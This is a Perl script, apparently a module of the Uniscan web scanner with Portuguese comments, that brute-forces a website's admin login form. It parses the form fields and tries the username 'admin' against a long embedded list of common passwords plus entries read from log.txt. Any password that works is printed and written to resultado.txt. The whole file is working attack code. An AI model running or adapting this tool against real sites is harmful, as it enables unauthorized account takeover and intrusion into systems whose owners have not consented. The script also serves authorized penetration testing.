#!/usr/bin/perl -w

use Uniscan::Configure;
use Uniscan::Functions;
use Uniscan::Http;
use strict;
use URI;
use HTTP::Request;
use HTTP::Response;
use HTTP::Headers;


my $c = Uniscan::Configure->new(conffile => "uniscan.conf");
my $func = Uniscan::Functions->new();
my $http = Uniscan::Http->new();
our %forms = ();
our %conf = ( );
%conf = $c->loadconf();
$|++;
alarm(120);

my $url = $ARGV[0];
$url = 'http://'. $url . '/' if ($url !~/^https?:\/\//);

exit if(!defined($url));
our @pages = ('admin/', 'adm/');
my @admin_pages = ();
my $pagina = "";
my $x = 1;
my @form=();
# Busca por paginas de adm

	$pagina = $url;
	my $res = $http->GET1($pagina);
	 if ($res->is_success && $res->code == 200) {
		if ( $res->is_success and $res->previous ){
			$pagina = $res->request->uri;
		}
	  push(@form, &add_form($pagina, $res->decoded_content));
	  push @admin_pages, $pagina;
	 }


my $arq;
open($arq, "<log.txt");
my @logins = <$arq>;
close($arq);

my @usernames = ('admin');
my @passwords = ('admin',"adm123", "admin123", "1234", "12345", "123456", "12345678", "123456789", "123mudar", "123alterar", "mudar123", "senha", "senha123", "password", "xxxxxx", "11111111", "turtle", "rainbow", "parker", "jessie", "123456", "welcome", "thx1138", "sophie", "gunner", "topgun", "shelby", "12345678", "james", "marlboro", "danielle", "987654", "asdfasdf", "chevy", "1234", "player", "zxcvbnm", "redskins", "freddy", "heaven", "broncos", "qwerty", "ncc1701", "panther", "toyota", "alexis", "animal", "airborne", "12345", "wizard", "redsox", "jason", "2112", "bigboy", "elephant", "dragon", "scooby", "victoria", "sierra", "1212", "2222", "marvin", "pussy", "charles", "7777777", "winston", "cocacola", "4444", "shit", "baseball", "junior", "jasper", "debbie", "xavier", "arthur", "action", "football", "internet", "angel", "gaints", "dolphin", "private", "adidas", "letmein", "mike", "david", "packers", "testing", "godzilla", "1313", "monkey", "brandy", "winner", "newyork", "bond007", "donald", "explorer", "696969", "tennis", "crystal", "jeremy", "member", "williams", "walker", "abc123", "banana", "golden", "112233", "calvin", "lifehack", "christin", "mustang", "monster", "butthead", "sandra", "7777", "phantom", "december", "michael", "spider", "viking", "lovers", "samson", "sammy", "therock", "shadow", "lakers", "jack", "mountain", "apollo", "brain", "dickhead", "master", "miller", "iwantu", "united", "walter", "platinum", "brooklyn", "jennifer", "rabbit", "shannon", "cooper", "tester", "jake", "dexter", "111111", "enter", "murphy", "driver", "voyager", "bronco", "racing", "2000", "mercedes", "angels", "helpme", "peter", "paul", " benjamin", "jordan", "brandon", "prince", "pookie", "bonnie", "mark", "qwert", "superman", "steven", "cameron", "lucky", "Rush2112", "frank", "kevin", "harley", "fender", "girls", "Maxwell", "scorpio", "copper", "sweet", "1234567", "john", "madison", "8675309", "jonathan", "billy", "sharon", "fuckme", "yamaha", "wilson", "222222", "skippy", "garfield", "online", "hunter", "diablo", "carlos", "shithead", "sydney", "august", "teresa", "fuckyou", "chris", "hooters", "hotdog", "scott", "rock", "gregroy", "trustno1", "boston", "willie", "monica", "red123", "dave", "redwings", "ranger", "marine", "startrek", "gemini", "gordon", "cool", "dreams", "buster", "chicago", "captain", "xxxxxxxx", "beaver", "carter", "michigan", "thomas", "rangers", "maddog", "777777", "jackass", "little", "hentai", "tigger", "gandalf", "jasmine", "florida", "flyers", "albert", "magnum", "robert", "winter", "booger", "88888888", "232323", "69696969", "87654321", "soccer", "bigtits", "angela", "nicholas", "zzzzzz", "kitten", "nothing", "fuck", "barney", "golf", "rosebud", "rebecca", "super", "donkey", "batman", "edward", "lauren", "metallic", "scorpion", "jordan23", "trinity", "test", "raiders", "rocket", "trouble", "doggie", "eagle1", "digital", "pass", "badboy", "tiffany", "stupid", "legend", "america", "333333", "killer", "blowme", "theman", "tomcat", "yankee", "11111", "stella", "hockey", "spanky", "dennis", "warrior", "blazer", "123321", "cartman", "george", "bigdaddy", "liverpoo", "peaches", "bill", "surfer", "guinness", "charlie", "johnson", "forever", "apples", "runner", "nissan", "123abc", "andrew", "chester", "jackie", "qwertyui", "birdie", "999999", "speedy", "michelle", "Midnight", "muffin", "buddy", "555555", "saturn", "buffalo", "Love", "vampire", "nelson", "kelly", "einstein", "pimpin", "kitty", "sunshine", "nirvana", "colorado", "brazil", "champion", "alicia", "whynot", "jessica", "xxxx", "creative", "allison", "fireman", "duncan", "baxter", "asshole", "playboy", "hello1", "raider", "indian", "general", "adam", "6969", "Lousie", "rocky", "jones", "clinton", "passport", "britney", "pepper", "pumpkin", "bollocks", "55555", "cobra", "arizona", "avalon", "daniel", "snowball", "scotty", "dude", "lucky1", "skipper", "wildcat", "access", "test123", "abcdef", "school", "admin", "rolltide", "raven", "123456789", "Mexico", "bubbles", "marshall", "dancer", "242424", "sandy", "654321", "beatles", "hawaii", "lovely", "security", "bulldogs", "stewart", "joshua", "fantasy", "stephen", "1qaz2wsx", "veronica", "digger", "elizabet", "maggie", "Ford", "thumper", "jeffrey", "hardon", "popcorn", "123654", "starwars", "Gibson", "55555", "caroline", "abcd1234", "accord", "wolfpacks", "silver", "Celtic", "darkness", "molly", "ironman", "liberty", "lawrence", "william", "marcus", "vanessa", "snickers", "remember", "jesus", "raymond", "dallas", "Cherry", "naughty", "leslie", "squirt", "happy1", "american", "yankees", "Cassie", "douglas", "courtney", "wildcats", "christ", "shaved", "123123", "888888", "azerty", "diesel", "francis", "classic", "snowman", "ashley", "natasha", "6666", "eminem", "great", "skipper", "raptor", "666666", "Sniper", "loveme", "westside", "dirty", "arizona", "stingray", "hello", "carolina", "4321", "suzuki", "justice", "turkey", "shooter", "amanda", "spencer", "4444444", "passion", "wolverin", "jenny", "france", "orange", "jimmy", "destiny", "hummer", "mercury", "titanic", "madmax", "biteme", "aaaa", "denise", "zachary", "Domino", "liverpool", "kristen", "freedom", "genesis", "vikings", "frankie", "denver", "friends", "jerry", "computer", "smith", "melanie", "elvis", "brooke", "mitchell", "789456", "sexy", "montana", "sabrina", "reggie", "rascal", "ireland", "chronic", "thunder", "homer", "howard", "alpha", "mistress", "7007", "hahaha", "nicole", "drummer", "123qwe", "simpson", "simon", "bunny", "hendrick", "ginger", "samuel", "xxxxx", "patricia", "hitman", "amber", "perfect", "heather", "stanley", "101010", "147147", "friend", "gabriel", "katie", "hammer", "1q2w3e4r", "extreme", "pirate", "stargate", "psycho", "252525", "summer", "eclipse", "password1", "tommy", "bondage", "lincoln", "oscar", "corvette", "1q2w3e", "vincent", "semperfi", "brittany", "arnold", "brother", "taylor", "kimberly", "hotmail", "jupiter", "bigman", "spiderman", "cannon", "fucker", "death", "amateur", "redrum", "zombie", "patriots", "georgia", "austin", "3333", "badger", "wanker", "duke", "devils", "popeye", "1111", "slipknot", "paradise", "freeuser", "scotland", "shaggy", "tatto", "merlin", "carmen", "crazy", "windows", "disney", "kawasaki", "texas", "matthew", "lasvegas", "mozart", "stinky", "rooster", "people", "panthers", "121212", "passw0rd", "maryjane", "smooth", "hunting", "54321", "pussycat", "golfer", "college", "anderson", "marley", "samsung", "chopper", "taurus", "cheese", "alexande", "norman", "212121", "candy", "kramer", "sailor", "princess", "reddog", "Barbara", "maximus", "olivia", "empire", "loverboy", "martin", "hotrod", "420420", "bradley", "rooster", "froggy", "berlin", "chelsea", "chance", "family", "pokemon", "swordfis", "hooker", "fisher", "patrick", "wolfgang", "trooper", "159753", "testtest", "mature", "russia", "richard", "freaky", "pyramid", "infinity", "pepsi", "hercules", "morris", "diamond", "pavilion", "antonio", "michele", "pickle", "outlaw", "james1", "yellow", "bowling", "danger", "rusty", "madonna", "wrangler", "apache", "bigdog", "zeppelin", "sterling", "casino", "tweety", "integra", "charlie1", "secret", "bigone", "dustin", "pandora", "indigo", "dilbert", "doggy", "asdfgh", "pretty", "pizza", "marino", "flipper", "catfish", "joker", "sparky", "wicked", "victory", "21122112", "awesome", "q1w2e3r4", "holiday", "cowboy", "dragon1", "devildog", "gizmo", "12341234", "street", "knicks", "camaro", "triumph", "bluebird", "eddie", "shotgun", "madman", "daisy", "anthony", "ronald", "unicorn", "casey", "miranda", "omega", "country", "matrix", "harrison", "danny", "winnie", "castle", "tyler", "asdf1234", "falcon", "indiana", "loveyou", "chuck", "freddie", "enterprise", "blizzard", "iloveyou", "trumpet", "12121212", "blaster", "logan", "precious", "norton", "bailey", "benson", "timber", "chipper", "atlanta", "polaris", "engineer", "guitar", "basketball", "valentine", "141414", "savage", "barbie", "newton", "jackson", "warlock", "watson", "maxima", "987654321", "1234qwer", "joejoe", "purple", "hamilton", "bigfoot", "icecream", "harold", "galaxy", "pleasure", "scooter", "marathon", "julian", "atlantis", "whiskey", "1966", "51505150", "phoenix", "predator", "1010", "justme", "shirley", "jackoff", "hollywood", "aaaaaa", "hello123", "manager", "soldier", "bernard", "titans", "goddess", "morgan", "323232", "tornado", "griffin", "campbell", "newman", "rockstar", "tigers", "funtime", "cookies", "314159", "sophia", "madness", "hiphop", "porsche", "ghost", "mongoose", "catdog", "clifford", "bomber", "toronto", "mickey", "sweetie", "456789", "foster", "sherlock", "dietcoke", "ultimate", "maverick", "ytrewq", "microsoft", "showme", "a1b2c3", "poison", "florence", "cookie", "alexandra", "qwertz", "stardust", "222222222", "leonard", "hamster", "nascar", "246810", "pioneer", "surfing", "frontier", "111222", "181818", "peanut", "2020", "102030", "michel", "iloveu", "171717", "2424", "justin", "pentium", "2468", "gator", "twister", "neptune", "showtime", "131313", "leonard", "363636", "2525", "voyeur", "mustangs", "stuart", "money", "napoleon", "motorola", "robinson", "griffey", "columbia", "picasso", "horny", "stranger", "oakland", "oooooo", "454545", "asd123", "343434", "samantha", "7654321", "77777", "hongkong", "mypass", "kingkong", "22222", "please", "98765", "brownie", "wisdom", "anything", "thompson", "272727", "steelers", "fernando", "onelove", "dingdong", "amazon", "cooldude", "oxford", "joseph", "a1b2c3d4", "peterpan", "monopoly", "191919", "321321", "1122", "snoopy", "1234abcd", "candyman", "lucky7", "sword", "student", "avenger", "boomer", "a12345", "solomon", "10101", "eternity", "chevrolete", "goodbye", "whatever", "1qazxsw2", "santiago", "1221", "565656", "usa123", "maryland", "iceman", "12344321", "catherin", "starship", "angelica", "465123", "pass123", "smokey", "333333333", "front242", "qwer1234", "iforgot", "741852", "xtreme", "gateway", "john316", "bristol", "505050", "technics", "123789", "99999", "dakota", "1919", "262626", "4121", "teenage", "piercing", "robotech", "cowboys", "zaq12wsx", "universe", "tsunami", "mechanic", "wildman", "quantum", "eagles", "spectrum", "megaman", "handsome", "theboss", "keystone", "something", "chicken", "revenge", "paradox", "636363", "420", "161616", "kingston", "zxcvbn", "666999", "luckydog", "10203", "134679", "pa55word", "zero", "black", "testing1", "halflife", "coolman", "124578", "1717", "1001", "andrea", "353535", "1024", "2345", "456456", "1005", "303030", "ferrari", "godfather", "143143", "manchester", "321654", "5551212", "happy123", "knight", "787878", "anaconda", "gotohell", "911911", "monalisa", "james007", "hardcore", "474747", "909090", "515151", "paaswort", "lionking", "tekken", "melissa", "poseidon", "thunderbird", "handyman", "batsman", "404040", "zxc123", "compaq", "*****", "19691969", "maggot", "asdzxc", "369369", "sandwich", "coffee", "sigma", "casanova", "24680", "21212121", "hannah", "525252", "1a2b3c4d", "789789", "bacardi", "sebastian", "187187", "meowmeow", "4ever", "johnny", "jamesbond", "pumpkins", "4you", "Iloveyou2", "amsterdam", "987987", "bulldog", "24682468", "xxx123", "daemon", "christopher", "cascade", "575757");


foreach my $log (@logins){
	chomp $log;
	push(@passwords, $log);
}



foreach my $f (@form){
	foreach my $username (@usernames){
		foreach my $password (@passwords){
			if($f =~/senhaaki/){
			#print "\rTestando $username -> $password\n";
			my $temp = $f;
			$temp =~s/123ons321/$username/gi;
			$temp =~s/senhaaki/$password/gi;
			if ($temp =~/\|#\|/) {

				my ($url1, $data) = split('\|#\|', $temp);
				my $res = $http->POST1($url1, $data);
				my $res2 = $http->GET1($admin_pages[0]);
				if(&checa_login($res2->decoded_content, &extract_inputs($f)) == 1 && $res2->code == 200){
						print "\nLogin encontrado:\nusuario: $username\nsenha: $password\n";
						my $arq;
						open($arq, ">>resultado.txt");
						print $arq $admin_pages[0] ."\n Login encontrado:\nusuario: $username\nsenha: $password\n\n\n";
						close($arq);
						exit;
					
					}
				}
			}
		}
	}

}






sub checa_login(){
	my ($dados, $string) = @_;
	return 0 if(!defined($dados));
	my @inp = split('\|', $string);
	my $verificador = 0;
	my $y = 0;	
	foreach my $input (@inp){
		if($dados =~/$input/){
			$verificador++;
		}
		$y++;
	}
	if ($verificador == $y) {
		return 0;
	}
	else{
		return 1;
	}
	
	
}




sub extract_inputs(){
	my $url = shift;
	#print "url: $url\n";
	my $inputs;
	if($url =~/\|#\|/){
		(undef, $inputs) = split('\|#\|', $url);
	}
	else {
		(undef, $inputs) = split('\?', $url);
	}
	my @splited = split('&', $inputs);
	my $ret = "";
	foreach my $sp (@splited){
		my ($input, $valor) = split('=', $sp);
		next if(!defined($valor));
		$ret .= $input . "|" if(defined($input) && length($input) < 12 && $valor =~/123ons321|senhaaki/);
	}
	chop $ret;
	exit if(length($ret) < 2);
	#print "Ret: $ret\n";
	return $ret;
}







    sub add_form(){
        my ($url, $conteudo) = @_;
        my @form = ();
        while($conteudo =~m/<form(.+?)<\/form>/gsi){
            my $f_cont = $1;
	
            my $action = &pega_action($url, $f_cont);
            my $dominio = &host($url);
            next if($action !~/$dominio/);
            my $method;
            while($f_cont =~m/method *= *["'](.+?)["']/gsi){
                $method = $1;
            }
            $method = "post" if(!$method);
            my @inputs = &get_input($f_cont);
            if($method =~ /get/i ){
                my $url2 = $action . '?';
                foreach my $var (@inputs){
			if($var && $url2 !~/\Q$var\E/ && $var =~/=/){
				$url2 .= '&'.$var;
			}
			elsif($var && $url2 !~/\Q$var\E/){
				$url2 .= '&'.$var .'=123ons321';
			}
                }
                push(@form, $url2);
            }
            else{
                my $data = "";
                foreach my $var (@inputs){
                    if($var && $data !~/\Q$var\E/  && $var =~/=/){
			$data .='&'.$var;
		    }
		    elsif($var && $data !~/\Q$var\E/){
			$data .='&'.$var.'=123ons321';
		    }
                }
                push(@form, $action . "|#|" . $data);
            }
        }
    return(@form);
    }

	
sub pega_action(){
        my ($url, $conteudo) = @_;
        my $protocolo;
        $protocolo = "http://" if($url =~/^http:\/\//i);
        $protocolo = "https://" if($url =~/^https:\/\//i);
        my $diretorio = &diretorio_atual($url);
        my $dom = &host($url);

        while($conteudo =~ m/action\s*=\s*['"](.+?)['"]/gsi){
                my $action = $1;
                if($action =~m/^https?:\/\/\Q$dom\E/gi){
                        return $action;
                }
                if($action =~ m/^\//){
                        $action = $protocolo . $dom . $action;
                        return $action;
                }
                if($action !~/^\/|^https?:\/\//i){
		while($action =~/^\.\.\//){
			$action = substr($action, 3, length($action));
			$diretorio =~s/\/$//;
			$diretorio = substr($diretorio, 0, rindex($diretorio, '/')+1);
		}
			
                        $action = $protocolo . $dom . $diretorio . $action;
                        return $action;
                }
                return $action if($action =~/^https?:\/\//);
                return $url;
        }
}

sub host(){
    my $h = $_[0];
    chomp $h;
    my $url1 = URI->new( $h || return -1 );
    return $url1->host();
}

        sub get_input(){
                my $content = shift;
                my @input = ();
                while ($content =~  m/<input(.+?)>/gi){
                        my $inp = $1;
                        if($inp =~ /name/i){
                                $inp =~ m/name *= *['"](.+?)['"]/gi;
				my $name = $1;
				if ($inp =~ /value="(.+?)"/gi) {
					my $valor =$1;
					$name .= "=" . $1 if($valor !~/"|'/);
				}
				if ($inp =~/password/) {
					$name .= "=senhaaki";
				}
				
                                push(@input, $name);
                        }
                }
                return @input;
        }

        sub diretorio_atual(){
                my $url = shift;

                $url =~s/https?:\/\///;
                my $dir = substr($url, index($url, '/'), length($url));
                $dir = substr($dir, 0, rindex($dir, '/')+1);
                $dir = '/' if($dir !~/^\//);
                return $dir;

        }
